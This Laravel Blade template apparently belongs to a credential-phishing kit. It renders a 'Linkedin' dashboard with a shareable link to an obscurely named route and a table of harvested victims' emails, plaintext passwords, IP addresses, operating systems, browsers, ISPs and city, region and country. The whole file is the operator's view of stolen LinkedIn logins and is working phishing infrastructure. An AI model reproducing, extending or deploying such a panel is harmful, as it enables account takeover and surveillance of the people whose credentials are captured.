@extends('layouts.dashboard')

@section('content')

<div class="row justify-content-center">
    <div class="col-md-12">
        <div class="">
            <div class="">{{ __('Linkedin') }}
                <hr>
                <p><strong>Share this link: </strong><a href="{{ route('yvaxrqva') }}" target="_blank" rel="noopener noreferrer">{{ __('Linkedin') }}</a></p>
            </div>
            
                
            <table class="table table-bordered table-striped table-hover">
                <thead>
                    <tr>
                        <th>email</th>
                        <th>password</th>
                        <th>ip</th>
                        <th>Os</th>
                        <th>Browser</th>
                        <th>isp</th>
                        <th>city</th>
                        <th>region</th>
                        <th>country</th>
                        <th>time</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach ($dataLinkedin as $dataL)
                        <tr>
                            <td>{{ $dataL->username }}</td>
                            <td>{{ $dataL->password }}</td>
                            <td>{{ $dataL->ip }}</td>
                            <td>{{ $dataL->os }}</td>
                            <td>{{ $dataL->browser }}</td>
                            <td>{{ $dataL->isp }}</td>
                            <td>{{ $dataL->city }}</td>
                            <td>{{ $dataL->region }}</td>
                            <td>{{ $dataL->country }}</td>
                            <td>{{ $dataL->created_at }}</td>
                        </tr>
                    @endforeach
                </tbody>
            </table>

            
        </div>
    </div>
</div>

@endsection
